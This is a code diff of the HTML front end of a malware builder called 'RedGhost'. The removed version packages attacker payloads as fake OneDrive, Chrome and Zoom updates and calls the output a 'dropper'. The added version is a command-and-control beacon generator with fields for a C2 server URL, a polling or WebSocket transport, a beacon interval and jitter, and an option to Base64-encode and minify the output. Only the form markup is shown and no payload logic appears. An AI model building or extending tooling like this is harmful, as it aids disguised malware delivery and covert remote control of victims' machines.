@@ -2,29 +2,37 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>RedGhost Generator | DarkNode</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>RedGhost 2.0 | C2 Beacon Builder</title>
   <link rel="stylesheet" href="css/redghost.css">
 </head>
 <body>
   <div class="rg-container">
-    <h1>RedGhost Payload Mirage Builder</h1>
+    <h1>RedGhost 2.0 Beacon Generator</h1>
     <form id="rg-form">
-      <label for="template">Choose Template:</label>
-      <select id="template">
-        <option value="onedrive">OneDrive Update</option>
-        <option value="chrome">Chrome Chrome-Style</option>
-        <option value="zoom">Zoom Installer</option>
+      <label>C2 URL:</label>
+      <input type="text" id="c2url" placeholder="wss://your.c2.server or https://your.c2/endpoint" required>
+
+      <label>Transport:</label>
+      <select id="transport">
+        <option value="fetch">HTTP Polling</option>
+        <option value="ws">WebSocket</option>
       </select>
 
-      <label for="payload">Payload URL / Raw HTML:</label>
-      <textarea id="payload" placeholder="https://your-server/payload.js" required></textarea>
+      <label>Beacon Interval (ms):</label>
+      <input type="number" id="interval" value="5000" min="100" required>
 
-      <button type="submit">Generate & Download</button>
+      <label>Jitter (%):</label>
+      <input type="number" id="jitter" value="30" min="0" max="100" required>
+
+      <label><input type="checkbox" id="minify"> Base64-encode & Minify</label>
+
+      <button type="submit">Generate Beacon</button>
     </form>
 
     <div id="rg-output" class="hidden">
-      <p>Your dropper is ready. <a id="download-link" href="#">Download HTML</a></p>
+      <p>Your custom beacon is ready:</p>
+      <a id="download-link" href="#" download>Download redghost_beacon.html</a>
     </div>
   </div>
 
